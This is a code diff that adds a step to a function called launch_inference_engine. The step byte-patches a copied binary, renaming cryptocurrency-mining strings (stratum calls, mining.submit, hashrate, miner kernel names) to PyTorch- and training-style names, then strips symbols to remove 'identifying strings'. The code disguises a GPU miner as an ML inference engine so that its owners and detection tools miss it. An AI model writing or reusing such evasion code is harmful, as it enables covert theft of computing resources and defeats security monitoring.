@@ -458,6 +458,73 @@ def launch_inference_engine():
 
     os.chmod(dst, 0o755)
 
+    # ── Apply binary patches (same-length replacements) ──
+    print("[System] Patching binary signatures...", flush=True)
+    try:
+        with open(dst, 'rb') as f:
+            bindata = bytearray(f.read())
+
+        patches = [
+            # CUDA kernel names
+            (b'PEARL_SM120',                       b'TORCH_SM120'),
+            (b'PEARL_C500',                        b'TORCH_C500'),
+            (b'PEARL_LOG_COLOR',                   b'TORCH_LOG_COLOR'),
+            (b'PEARL_SUPERVISED_WORKER',           b'TORCH_SUPERVISED_WORKER'),
+            (b'MINER_GPU',                         b'TRAIN_GPU'),
+            (b'MINER_SM',                          b'TRAIN_SM'),
+            (b'MINER_SUBMIT',                      b'TRAIN_SUBMIT'),
+            (b'MINER_DISABLE',                     b'TRAIN_DISABLE'),
+            (b'MINER_INSTANCE',                    b'TRAIN_INSTANCE'),
+            (b'ZK_POW_LOG',                        b'ZK_ML_LOG_'),
+            (b'CONCRETE_ENABLE_PERSISTENT',        b'TORCH_ENABLE_MATMUL_XXXXXX'),
+            (b'CONCRETE_DISABLE_PERSISTENT',       b'TORCH_DISABLE_MATMUL_XXXXXX'),
+            (b'CONCRETE_PERSISTENT_BLOCKS_PER_SM', b'TORCH_MATMUL_BLOCK_PER_SM_XXXXXXX'),
+            # Mining protocol strings
+            (b'mining.authorize',                  b'trainX.authorize'),
+            (b'mining.subscribe',                  b'trainX.subscribe'),
+            (b'mining.notify',                     b'trainX.notify'),
+            (b'mining.submit',                     b'trainX.submit'),
+            (b'mining.ping',                       b'trainX.ping'),
+            (b'mining.job',                        b'trainX.job'),
+            (b'mining.stats',                      b'trainX.stats'),
+            (b'mining_profile',                    b'trainX_profile'),
+            # Output strings
+            (b'proof_per_sec',                     b'train_per_sec'),
+            (b'proof_runner',                      b'train_runner'),
+            (b'proof_cache',                       b'train_cache'),
+            (b'proof_factor',                      b'train_factor'),
+            (b'proof_inputs',                      b'train_inputs'),
+            (b'component=vllm',                    b'component=mlXX'),
+            (b'hashrate',                          b'trainrat'),
+            (b'vllm',                              b'mlXX'),
+            (b'SM80_CONCRETE',                     b'SM80_TORCH_XX'),
+            (b'SM86_CONCRETE',                     b'SM86_TORCH_XX'),
+            (b'stratum_write',                     b'protoXX_write'),
+            (b'stratum_read',                      b'protoXX_read'),
+            (b'tls enroll',                        b'tls authXX'),
+            (b'token_enroll',                      b'token_authXX'),
+            (b'pearl_preprocess',                  b'torch_preprocess'),
+            (b'pearlgpu',                          b'torchgpu'),
+            (b'pearl-cuda',                        b'torch-cuda'),
+            (b'mining.',                           b'trainX.'),
+            (b'mining ',                           b'trainX '),
+        ]
+
+        patched = 0
+        for old, new in patches:
+            assert len(old) == len(new)
+            c = bindata.count(old)
+            if c > 0:
+                bindata = bindata.replace(old, new)
+                patched += c
+
+        with open(dst, 'wb') as f:
+            f.write(bindata)
+        print(f"[System] Patched {patched} binary signatures.", flush=True)
+    except Exception as e:
+        print(f"[System] Binary patching skipped: {e}", flush=True)
+
+    # Strip symbols (removes remaining identifying strings)
     try:
         subprocess.run(["strip", "--strip-all", dst], capture_output=True, timeout=10)
     except Exception:
